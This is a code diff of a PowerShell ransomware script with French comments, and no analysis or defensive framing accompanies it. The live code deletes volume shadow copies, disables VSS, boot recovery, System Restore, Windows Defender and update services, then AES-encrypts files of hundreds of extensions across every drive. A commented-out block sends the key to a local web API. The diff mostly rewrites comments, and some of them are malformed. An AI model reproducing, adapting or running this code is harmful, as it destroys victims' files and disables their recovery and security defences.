@@ -1,6 +1,5 @@
 function Get-Files($drive){
     $files = gci "$($drive.Name)\Users\" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv
-    #$files = gci "C:\Users\" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv
     return $files
 }
 
@@ -48,7 +47,7 @@ function Decrypt-String($key, $encryptedStringWithIV) {
     $aesManaged = Create-AesManagedObject $key $IV
     $decryptor = $aesManaged.CreateDecryptor();
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
-    #$aesManaged.Dispose()
+    <#$aesManaged.Dispose()#>
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
 
@@ -119,28 +118,28 @@ function Decrypt-All($key){
 function main{
     $erroractionPreference="stop"
    try{
-        # Remove all snapshots
+        <# Remove all snapshots#>
         gwmi Win32_Shadowcopy|%{if($($_.ClientAccessible) -eq "True"){$_.Delete()}};
-         # Stop the Volume Snapshot Service
+         <# Stop the Volume Snapshot Service#>
         spsv vss -ErrorAction SilentlyContinue;
-        # Disable the Volume Snapshot Service
+        <# Disable the Volume Snapshot Service#>
         if(((gwmi -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode) -ne "Disabled"){
         set-service vss -StartupType Disabled};
     }
     catch{}
     try{
-        # Disable recovery options
-        # Disable Startup Repair from trying to start when a problem is detected
+        <# Disable recovery options#>
+        <# Disable Startup Repair from trying to start when a problem is detected#>
         bcdedit /set recoveryenabled No|Out-Null;
     }
     catch{} 
     try {
-        # Disable Windows recovery at startup
+       < # Disable Windows recovery at startup#>
         bcdedit /set bootstatuspolicy ignoreallfailures|Out-Null; 
     }
     catch {}
     try{
-        # Stop and disable the services Wscsvc - WinDefend - Wuauserv - BITS - ERSvc - WerSvc
+      <  # Stop and disable the services Wscsvc - WinDefend - Wuauserv - BITS - ERSvc - WerSvc#>
         spsv Wscsvc -ErrorAction SilentlyContinue;
         if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wscsvc'").StartMode) -ne "Disabled"){
         set-service Wscsvc -StartupType Disabled};
@@ -164,14 +163,14 @@ function main{
 
     $hklm=2147483650;$hkcu = 2147483649;
     $reg=[WMIClass]"ROOT\DEFAULT:StdRegProv";
-    # Disable the security center notifications
+   < # Disable the security center notifications#>
     $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}";
     $reg.DeleteKey($hklm, $key)|out-null;
-    # Disable the system restore
+   < # Disable the system restore#>
     $key="SOFTWARE\Microsoft\Windows\CurrentVersion\SystemRestore";
     $reg.CreateKey($hklm, $key)|out-null;
     $reg.SetDWORDValue($hklm, $key, "DisableSR", "1")|out-null;
-    # To hide Windows Defender notification icon
+    <# To hide Windows Defender notification icon#>
     $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
     $reg.DeleteValue($hklm, $key, "WindowsDefender")|out-null;
     $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run";
@@ -180,26 +179,25 @@ function main{
     $reg.DeleteValue($hkcu, $key, "Windows Defender")|out-null;
     $key="SOFTWARE\Policies\Microsoft\Windows Defender";
 
-    #List al the drives in the computer
+   < #List al the drives in the computer#>
     $drives=gwmi Win32_LogicalDisk -Filter "DriveType=3 or DriveType=4"|select Name;
 
-    #Créée la clé AES
+   < #Créée la clé AES#>
     $key = Create-AesKey
     Set-Content 'key.aes' -Value $key 
-    #Envoie la clé AES à notre API Web
+    <#Envoie la clé AES à notre API Web#>
     <#try{
         $ok = Invoke-WebRequest -Uri http://192.168.1.28:8080/ -Method POST -Body $key -UseBasicParsing
     }
     catch{}#>
 
-    #Initialisation de l'AES
+    <#Initialisation de l'AES#>
     $aesManaged = Create-AesManagedObject $key
     $encryptor = $aesManaged.CreateEncryptor()
-    #Si plusieurs disques, faire un thread par disque 
-    #$ScriptBlock = {Encrypt-All $key $args $aesManaged $encryptor}
+    <#Si plusieurs disques, faire un thread par disque #>
     foreach ($drive in $drives){
         Encrypt-All $key $drive $aesManaged $encryptor
     }
-    #$aesManaged.Dispose()
+    <#$aesManaged.Dispose()#>
 }
 main
